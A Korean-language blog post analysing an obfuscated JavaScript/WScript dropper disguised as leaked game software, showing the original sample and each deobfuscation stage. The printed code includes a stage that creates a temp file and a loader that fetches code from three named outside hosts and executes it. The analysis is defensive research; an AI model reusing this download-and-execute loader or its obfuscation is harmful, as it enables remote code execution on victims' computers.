---
layout: post
title: **Analysis of malicious JavaScript code pretending to leaked game software**
subtitle: **유출된 유료 게임 소프트웨어를 가장한 악성 JavaScript에 대한 간단한 코드 분석**
excerpt: 유출된 유료 게임 소프트웨어를 가장한 악성 JavaScript에 대한 간단한 코드 분석
tags:
  - Javascript
  - Analysis
  - Malware
  - Research
published: true
---

#### 유출된 유료 게임 소프트웨어를 가장한 악성 JavaScript에 대한 간단한 코드 분석

Analysis of malicious JavaScript code pretending to leaked game software

#### ##### 



##### 0. 시나리오

추가예정.





```javascript
function fW4(gT78,QU36) {oJ47 = SK92;pl56=qN252; while (pl56 < Mg89) {Vw3 = kZ37("c\h\arAt",gT78,pl56);if (pl56 % (KN79+KN79)) oJ47=oJ47+Vw3; else oJ47=Vw3+oJ47; pl56++; }return (oJ47);}function TZ76(hH33){KN79=hH33;xj34=KN79+hH33*KN79+hH33;Mg89=2269;}
function VX30() {FQ96 = kZ37("sp\l\it",ew84,Li29);}function kZ37(iy87,tS71,cl45){ QO71=tS71[iy87](cl45); return QO71;}function nb5() {FQ96[xj34](FQ96[KN79])(FQ96[KN79]);}function EO49(Fg50){AP9826 = 'fir/opc\\r\'Stu+W.m] s.5{lp5 ehD)epj1p\'[\\(-4+2=8\"2\\a=2?Z)2e+)2h\\0\'h) /t;,/l \":\\}xp@ et\"e\\tel+hgs4\\b\'4eu Y n,y{i\\+\'= \"T\\S\"E\\y@G+4\"\\\\\'y3((Y fn4=Oe4 xp,Seo yd.f4n6a3i8l..rsr3Wee4 )py{;lSy a(rWc(tre  8(f;6\\i\".) @s0;\\e\"t3n+x+dye0(YT7)4e,;4s2 +n(}\\o\"c]p@a\\s\"t\\e\"crr,ht.\\(\"6se\\8\")br){uW; s  r\\=\"ev [ta3)ur4(r ygnfSn S if8rra5atl vSs= oe {t;S . y))}40( 30mi.2ofr d e=n(p=aWl=rra .8csh6eut.(tas/aMt(\' (\\4\\W=fd( ]{24-254[}6Y9)QyF/}  g;;1,-)2 +\\2\'3foPfu=T2n3TocfH t;L)i)M2o3Xonfr( (e](\"v\"S+r\"dte\"9+S\"7\".+)\"2r \"L+{\"M\" +X\"rqS\"e+M\"t\"\\+\'\"us(\"r+t\"n\"c[ hetSajMt b{r O)i e9n0t6g2a9.0e5f1r r<C o2.3motfC(p heilairhrwc C;S6o W=d  2e3=o(f ;p)6(ae8srorlsCW.e) eIu{rnt  t,)2(93ASO (de<l9i F7t5x,e5T1eDt0aje)r(C+. 231eQ0Cl;))i(;thi uwQ}. t)p;i;r0c S WF =)Q) 2995A6O5([sDt3sji]x E(e;lfi]FS.\\2\"18QmC5(o )fci(;.\")pom;td. 7-6W1d9S2n1cvaHr\\-\\i\"e+p)b2t-.4.(w]Q\"wru\"w+i\"\\e\"dtl,o(\"\\+\"\")Fel;ad\" +.\"}ijc \"4+}\"oe p.Setw\"l+w\"sewGe\"\\[\"2 1,Q{C\\=\"2 9lAWOp;S).\"ctdcrecjiblOpm-ettms.yeSsejlliaFe.ngenyiptwp(i.r2ctS2\"s(2tec2etj2b.O)ewt;awe rwC}.\\t\"p i[rjc SDW= 5=  5241+Q8C+;a\';\'Z=}r\'e)p)b(ufnox3I2l)y;qtrcogtmcaucr=tFsQn9o6c;';qN252=Fg50;SK92 = "";}Li29="qylIx";EO49(0);TZ76(1);ew84=fW4(AP9826,qN252);VX30();function NW87() {FQ96[xj34] = EO49[FQ96[qN252]];}NW87();nb5();
```

이렇게 난독화된 JavaScript를 볼 수 있다.

해당 코드를 동적/정적인 방식으로 분석 할 예정이다.



##### 1. 분석 과정

	1. 일단 해당 코드에 걸린 난독화를 최대한 보기 쉽게 바꾸고, 이후에 코드 flow를 파악한다.
 	2. Excute되는 Script의 악성 행위를 분석한다.



##### 2. 분석 시작

개행마저 안 되어 있기 때문에,  [Online JavaScript Beautifier](https://beautifier.io/)를 통해 코드를 1차 정리 해 주겠다.

```javascript
function fW4(gT78, QU36) {
    oJ47 = SK92;
    pl56 = qN252;
    while (pl56 < Mg89) {
        Vw3 = kZ37("c\h\arAt", gT78, pl56);
        if (pl56 % (KN79 + KN79)) oJ47 = oJ47 + Vw3;
        else oJ47 = Vw3 + oJ47;
        pl56++;
    }
    return (oJ47);
}

function TZ76(hH33) {
    KN79 = hH33;
    xj34 = KN79 + hH33 * KN79 + hH33;
    Mg89 = 2269;
}

function VX30() {
    FQ96 = kZ37("sp\l\it", ew84, Li29);
}

function kZ37(iy87, tS71, cl45) {
    QO71 = tS71[iy87](cl45);
    return QO71;
}

function nb5() {
    FQ96[xj34](FQ96[KN79])(FQ96[KN79]);
}

function EO49(Fg50) {
    AP9826 = 'fir/opc\\r\'Stu+W.m] s.5{lp5 ehD)epj1p\'[\\(-4+2=8\"2\\a=2?Z)2e+)2h\\0\'h) /t;,/l \":\\}xp@ et\"e\\tel+hgs4\\b\'4eu Y n,y{i\\+\'= \"T\\S\"E\\y@G+4\"\\\\\'y3((Y fn4=Oe4 xp,Seo yd.f4n6a3i8l..rsr3Wee4 )py{;lSy a(rWc(tre  8(f;6\\i\".) @s0;\\e\"t3n+x+dye0(YT7)4e,;4s2 +n(}\\o\"c]p@a\\s\"t\\e\"crr,ht.\\(\"6se\\8\")br){uW; s  r\\=\"ev [ta3)ur4(r ygnfSn S if8rra5atl vSs= oe {t;S . y))}40( 30mi.2ofr d e=n(p=aWl=rra .8csh6eut.(tas/aMt(\' (\\4\\W=fd( ]{24-254[}6Y9)QyF/}  g;;1,-)2 +\\2\'3foPfu=T2n3TocfH t;L)i)M2o3Xonfr( (e](\"v\"S+r\"dte\"9+S\"7\".+)\"2r \"L+{\"M\" +X\"rqS\"e+M\"t\"\\+\'\"us(\"r+t\"n\"c[ hetSajMt b{r O)i e9n0t6g2a9.0e5f1r r<C o2.3motfC(p heilairhrwc C;S6o W=d  2e3=o(f ;p)6(ae8srorlsCW.e) eIu{rnt  t,)2(93ASO (de<l9i F7t5x,e5T1eDt0aje)r(C+. 231eQ0Cl;))i(;thi uwQ}. t)p;i;r0c S WF =)Q) 2995A6O5([sDt3sji]x E(e;lfi]FS.\\2\"18QmC5(o )fci(;.\")pom;td. 7-6W1d9S2n1cvaHr\\-\\i\"e+p)b2t-.4.(w]Q\"wru\"w+i\"\\e\"dtl,o(\"\\+\"\")Fel;ad\" +.\"}ijc \"4+}\"oe p.Setw\"l+w\"sewGe\"\\[\"2 1,Q{C\\=\"2 9lAWOp;S).\"ctdcrecjiblOpm-ettms.yeSsejlliaFe.ngenyiptwp(i.r2ctS2\"s(2tec2etj2b.O)ewt;awe rwC}.\\t\"p i[rjc SDW= 5=  5241+Q8C+;a\';\'Z=}r\'e)p)b(ufnox3I2l)y;qtrcogtmcaucr=tFsQn9o6c;';
    qN252 = Fg50;
    SK92 = "";
}
Li29 = "qylIx";
EO49(0);
TZ76(1);
ew84 = fW4(AP9826, qN252);
VX30();

function NW87() {
    FQ96[xj34] = EO49[FQ96[qN252]];
}
NW87();
nb5();
```

하지만 여전히 코드는 형체를 알아 볼 수 없다.

function EO49(Fg50)를 들여다 보자

```javascript
function EO49(Fg50) {
     = 'fir/opc\\r\'Stu+W.m] s.5{lp5 ehD)epj1p\'[\\(-4+2=8\"2\\a=2?Z)2e+)2h\\0\'h) /t;,/l \":\\}xp@ et\"e\\tel+hgs4\\b\'4eu Y n,y{i\\+\'= \"T\\S\"E\\y@G+4\"\\\\\'y3((Y fn4=Oe4 xp,Seo yd.f4n6a3i8l..rsr3Wee4 )py{;lSy a(rWc(tre  8(f;6\\i\".) @s0;\\e\"t3n+x+dye0(YT7)4e,;4s2 +n(}\\o\"c]p@a\\s\"t\\e\"crr,ht.\\(\"6se\\8\")br){uW; s  r\\=\"ev [ta3)ur4(r ygnfSn S if8rra5atl vSs= oe {t;S . y))}40( 30mi.2ofr d e=n(p=aWl=rra .8csh6eut.(tas/aMt(\' (\\4\\W=fd( ]{24-254[}6Y9)QyF/}  g;;1,-)2 +\\2\'3foPfu=T2n3TocfH t;L)i)M2o3Xonfr( (e](\"v\"S+r\"dte\"9+S\"7\".+)\"2r \"L+{\"M\" +X\"rqS\"e+M\"t\"\\+\'\"us(\"r+t\"n\"c[ hetSajMt b{r O)i e9n0t6g2a9.0e5f1r r<C o2.3motfC(p heilairhrwc C;S6o W=d  2e3=o(f ;p)6(ae8srorlsCW.e) eIu{rnt  t,)2(93ASO (de<l9i F7t5x,e5T1eDt0aje)r(C+. 231eQ0Cl;))i(;thi uwQ}. t)p;i;r0c S WF =)Q) 2995A6O5([sDt3sji]x E(e;lfi]FS.\\2\"18QmC5(o )fci(;.\")pom;td. 7-6W1d9S2n1cvaHr\\-\\i\"e+p)b2t-.4.(w]Q\"wru\"w+i\"\\e\"dtl,o(\"\\+\"\")Fel;ad\" +.\"}ijc \"4+}\"oe p.Setw\"l+w\"sewGe\"\\[\"2 1,Q{C\\=\"2 9lAWOp;S).\"ctdcrecjiblOpm-ettms.yeSsejlliaFe.ngenyiptwp(i.r2ctS2\"s(2tec2etj2b.O)ewt;awe rwC}.\\t\"p i[rjc SDW= 5=  5241+Q8C+;a\';\'Z=}r\'e)p)b(ufnox3I2l)y;qtrcogtmcaucr=tFsQn9o6c;';
    qN252 = Fg50;
    SK92 = "";
}
```

뭔가 eval 코드로 추청되는 문자열을 AP9826에 담았다.

AP9826을 사용하는 부분을 추적 해 보면,

```javascript
ew84=fW4(AP9826,qN252);
```

fW4라는 함수에 AP9826과 qN252를 넣어 호출한다.

즉 , eval 코드를 난독화한 문자열(AP9826)를 FW4함수를 통해 *deobfuscate 데이터를* ew84에 담는다.

ew84를 **실행**해야 하기 때문에 **ew84를 호출하는 부분**을 찾으면 된다.



다행히(?) ew84는 바로 다음 라인에서 바로 호출된다.

```javascript
function VX30() {
    FQ96 = kZ37("sp\l\it", **ew84**, Li29);
}
```

아직 ew84를 실행하지 않는 것을 보니, *deobfuscate*가 덜 끝났나보다.

kZ37라는 함수에 의해 정리된 데이터를 다시 FQ96에 담는다.

이후,

```javascript
NW87();
nb5();
```

이 두 함수가 실행되고 스크립트는 끝이 난다.

NW87함수에서 다시 FQ96를 *deobfuscate*하고,

이후 FQ96에 파라메타를 보내 Execute Script를 한다.



Execute Script를 곧장 확인 하기 위해서

코드를 실행해 어떠한 Script가 Execute되는지 확인 해 보았다.

해당 스크립트는 다음과 같다.



```javascript
(function anonymous(
) {
nubper='';CQ12 = WScript.CreateObject("Scripting.FileSystemObject");OA92=CQ12["Ge"+"tSpe"+"ci"+"alF"+"olde"+"r"](4-2)+"\\Hv129167.tmp";if (CQ12.FileExists(OA92)) WScript.Quit();CQ12.CreateTextFile(OA92, true).Close();fo32 = 6; while (fo32 < 15092609 ) { Math[""+"s"+""+"q"+""+"r"+""+"t"+""]((fo32)); fo32=fo32+2-1; }FQ96[5-2](fW4('tast.u6s8 r=W=(=  f2i0 0})  ;{e svlaarf  Snyr4u3t e=r  W{r)8e6(.hrcetsapco}n s;e)T(edxnte;s .i6f8 r(W( S;y)4e3s.lianfd e,x4O4fY(y\"+@\"\"=+iynYu4b4g+e\"e@x\"l,t h0h)e)?=\"=+-\'1p)h p{. mWuSrcorfi/p\'t+.]s5l5eDejp[(4282a2Z2+2\')/;/ :}p tetlhs\'e  ,{\' TSEyG4\'3( n=e pSoy.4638.rrWe p{lyarcte (;\")@0\"3++y0Y74,42+(\"]@\"\"r,t\"s\"b)u;s \"v[a)r( gfnSi8r5t S=o tS.y)4(3m.ordenpalra.chet(a/M( \\=d {424}Y)y/ g;,) \'fPuTnTcHtLiMoXnr e(vSrde9S7.)2 L{M XrSeMt\'u(rtnc eSjtbrOientga.efrrCo.mtCphiarrcCSoWd e=( p6a8rrsWe I{n t)(3S d<9 75,51D0j)(+ 3e0l)i;h w} );;0  F=Q 9565[D3j] (;f]S\"8m5o)c(.)o;d -WdSncar-iepbt..wQwuwi\"t,(\")e;d .}j 4}o .ewlwswe\" ,{\" lWpS.cdrcilp-tm.esjlaeneypw(.2t2s2e2t2.)w;w w}\" [j D=5 54+8+a;Z}'))(fo32);tcgmac=FQ96;
})
```

해당 코드도 난독화가 되어 있다.

개행마저 안 되어 있기 때문에,  [Online JavaScript Beautifier](https://beautifier.io/)를 통해 코드를 1차 정리 해 주겠다.



```javascript
(function anonymous() {
    nubper = '';
    CQ12 = WScript.CreateObject("Scripting.FileSystemObject");
    OA92 = CQ12["Ge" + "tSpe" + "ci" + "alF" + "olde" + "r"](4 - 2) + "\\Hv129167.tmp";
    if (CQ12.FileExists(OA92)) WScript.Quit();
    CQ12.CreateTextFile(OA92, true).Close();
    fo32 = 6;
    while (fo32 < 15092609) {
        Math["" + "s" + "" + "q" + "" + "r" + "" + "t" + ""]((fo32));
        fo32 = fo32 + 2 - 1;
    }
    FQ96[5 - 2](fW4('tast.u6s8 r=W=(=  f2i0 0})  ;{e svlaarf  Snyr4u3t e=r  W{r)8e6(.hrcetsapco}n s;e)T(edxnte;s .i6f8 r(W( S;y)4e3s.lianfd e,x4O4fY(y\"+@\"\"=+iynYu4b4g+e\"e@x\"l,t h0h)e)?=\"=+-\'1p)h p{. mWuSrcorfi/p\'t+.]s5l5eDejp[(4282a2Z2+2\')/;/ :}p tetlhs\'e  ,{\' TSEyG4\'3( n=e pSoy.4638.rrWe p{lyarcte (;\")@0\"3++y0Y74,42+(\"]@\"\"r,t\"s\"b)u;s \"v[a)r( gfnSi8r5t S=o tS.y)4(3m.ordenpalra.chet(a/M( \\=d {424}Y)y/ g;,) \'fPuTnTcHtLiMoXnr e(vSrde9S7.)2 L{M XrSeMt\'u(rtnc eSjtbrOientga.efrrCo.mtCphiarrcCSoWd e=( p6a8rrsWe I{n t)(3S d<9 75,51D0j)(+ 3e0l)i;h w} );;0  F=Q 9565[D3j] (;f]S\"8m5o)c(.)o;d -WdSncar-iepbt..wQwuwi\"t,(\")e;d .}j 4}o .ewlwswe\" ,{\" lWpS.cdrcilp-tm.esjlaeneypw(.2t2s2e2t2.)w;w w}\" [j D=5 54+8+a;Z}'))(fo32);
    tcgmac = FQ96;
})
```

line 4와 line 9에서 문자 분리 해 놓은것을 제대로 바꿔 보겠다.

```javascript
(function anonymous() {
    nubper = '';
    CQ12 = WScript.CreateObject("Scripting.FileSystemObject");
    OA92 = CQ12["GetSpecialFolder"](4 - 2) + "\\Hv129167.tmp";
    if (CQ12.FileExists(OA92)) WScript.Quit();
    CQ12.CreateTextFile(OA92, true).Close();
    fo32 = 6;
    while (fo32 < 15092609) {
        Math["sqrt"]((fo32));
        fo32 = fo32 + 2 - 1;
    }
    FQ96[5 - 2](fW4('tast.u6s8 r=W=(=  f2i0 0})  ;{e svlaarf  Snyr4u3t e=r  W{r)8e6(.hrcetsapco}n s;e)T(edxnte;s .i6f8 r(W( S;y)4e3s.lianfd e,x4O4fY(y\"+@\"\"=+iynYu4b4g+e\"e@x\"l,t h0h)e)?=\"=+-\'1p)h p{. mWuSrcorfi/p\'t+.]s5l5eDejp[(4282a2Z2+2\')/;/ :}p tetlhs\'e  ,{\' TSEyG4\'3( n=e pSoy.4638.rrWe p{lyarcte (;\")@0\"3++y0Y74,42+(\"]@\"\"r,t\"s\"b)u;s \"v[a)r( gfnSi8r5t S=o tS.y)4(3m.ordenpalra.chet(a/M( \\=d {424}Y)y/ g;,) \'fPuTnTcHtLiMoXnr e(vSrde9S7.)2 L{M XrSeMt\'u(rtnc eSjtbrOientga.efrrCo.mtCphiarrcCSoWd e=( p6a8rrsWe I{n t)(3S d<9 75,51D0j)(+ 3e0l)i;h w} );;0  F=Q 9565[D3j] (;f]S\"8m5o)c(.)o;d -WdSncar-iepbt..wQwuwi\"t,(\")e;d .}j 4}o .ewlwswe\" ,{\" lWpS.cdrcilp-tm.esjlaeneypw(.2t2s2e2t2.)w;w w}\" [j D=5 54+8+a;Z}'))(fo32);
    tcgmac = FQ96;
})
```

line 4에서 GetSpecialFolder를 통해 로컬 PC의 특정 디렉토리에 접근하는 것을 알 수 있다.

해당 경로에 Hv129167.tmp가 없으면 만들어 준다.

마지막 두줄에서 **FQ96**에 코드를 넘겨 Execute Code하는것을 볼 수 있다.

```javascript
    FQ96[5 - 2](fW4('tast.u6s8 r=W=(=  f2i0 0})  ;{e svlaarf  Snyr4u3t e=r  W{r)8e6(.hrcetsapco}n s;e)T(edxnte;s .i6f8 r(W( S;y)4e3s.lianfd e,x4O4fY(y\"+@\"\"=+iynYu4b4g+e\"e@x\"l,t h0h)e)?=\"=+-\'1p)h p{. mWuSrcorfi/p\'t+.]s5l5eDejp[(4282a2Z2+2\')/;/ :}p tetlhs\'e  ,{\' TSEyG4\'3( n=e pSoy.4638.rrWe p{lyarcte (;\")@0\"3++y0Y74,42+(\"]@\"\"r,t\"s\"b)u;s \"v[a)r( gfnSi8r5t S=o tS.y)4(3m.ordenpalra.chet(a/M( \\=d {424}Y)y/ g;,) \'fPuTnTcHtLiMoXnr e(vSrde9S7.)2 L{M XrSeMt\'u(rtnc eSjtbrOientga.efrrCo.mtCphiarrcCSoWd e=( p6a8rrsWe I{n t)(3S d<9 75,51D0j)(+ 3e0l)i;h w} );;0  F=Q 9565[D3j] (;f]S\"8m5o)c(.)o;d -WdSncar-iepbt..wQwuwi\"t,(\")e;d .}j 4}o .ewlwswe\" ,{\" lWpS.cdrcilp-tm.esjlaeneypw(.2t2s2e2t2.)w;w w}\" [j D=5 54+8+a;Z}'))(fo32);
    tcgmac = FQ96;
```

파라메타로 넘긴 코드는 다음과 같다.

```javascript
(function anonymous(
) {
Za84 = ["www.test.wynajem-lcd.pl","www.o4j.de","www.be-and-do.com"]; jD55 = 0; while (jD55 < 3) { Wr86 = WScript.CreateObject('MSXML2.ServerXMLHTTP'); yY44 = Math.random().toString()["substr"](2,70+30); try{ Wr86.open('GET', 'http://'+Za84[jD55]+'/forum.php'+"?ehhtlxeegbuni="+yY44, false); Wr86.send(); }catch(e){ return false; } if (Wr86.status === 200) { var Sy43 = Wr86.responseText; if ((Sy43.indexOf("@"+yY44+"@", 0))==-1) { WScript.sleep(22222); } else { Sy43 = Sy43.replace("@"+yY44+"@",""); var fS85 = Sy43.replace(/(\d{2})/g, function (Sd97) { return String.fromCharCode(parseInt(Sd97,10)+30); }); FQ96[3](fS85)(); WScript.Quit(); } } else { WScript.sleep(22222); } jD55++;}
})
```

해당코드 또한  [Online JavaScript Beautifier](https://beautifier.io/)를 통해 코드를 1차 정리 해 주겠다.

```javascript
(function anonymous() {
    Za84 = ["www.test.wynajem-lcd.pl", "www.o4j.de", "www.be-and-do.com"];
    jD55 = 0;
    while (jD55 < 3) {
        Wr86 = WScript.CreateObject('MSXML2.ServerXMLHTTP');
        yY44 = Math.random().toString()["substr"](2, 70 + 30);
        try {
            Wr86.open('GET', 'http://' + Za84[jD55] + '/forum.php' + "?ehhtlxeegbuni=" + yY44, false);
            Wr86.send();
        } catch (e) {
            return false;
        }
        if (Wr86.status === 200) {
            var Sy43 = Wr86.responseText;
            if ((Sy43.indexOf("@" + yY44 + "@", 0)) == -1) {
                WScript.sleep(22222);
            } else {
                Sy43 = Sy43.replace("@" + yY44 + "@", "");
                var fS85 = Sy43.replace(/(\d{2})/g, function(Sd97) {
                    return String.fromCharCode(parseInt(Sd97, 10) + 30);
                });
                FQ96[3](fS85)();
                WScript.Quit();
            }
        } else {
            WScript.sleep(22222);
        }
        jD55++;
    }
})
```

해당 사이트들에 접속해서 contents(Execute할 Code)를 Parse해 온다.

```javascript
FQ96[3](fS85)();
WScript.Quit();
```

이후 FQ96[3]에 contents를 넘기고 스크립트는 끝이난다.

```javascript
Za84 = ["www.test.wynajem-lcd.pl", "www.o4j.de", "www.be-and-do.com"];
```

서버는 열려있으나 악성 JS코드는 노출이 되지 않았다.

FQ96를 통해 코드를 실행 하는데, 코드는 더이상 **접근 불가능한 웹서버**에 있으므로 **더이상 분석이 불가능**했다.



해당 악성코드에 대한 추측을 해 보자면,

아까 생성한 Hv129167.tmp파일에 악성바이너리를 덮어 실행하는 행위지 않을까 싶다.

악성바이너리 까지 분석 해 보고싶었는데 악성 JS코드 노출이 되지않아 많이 아쉬웠다.
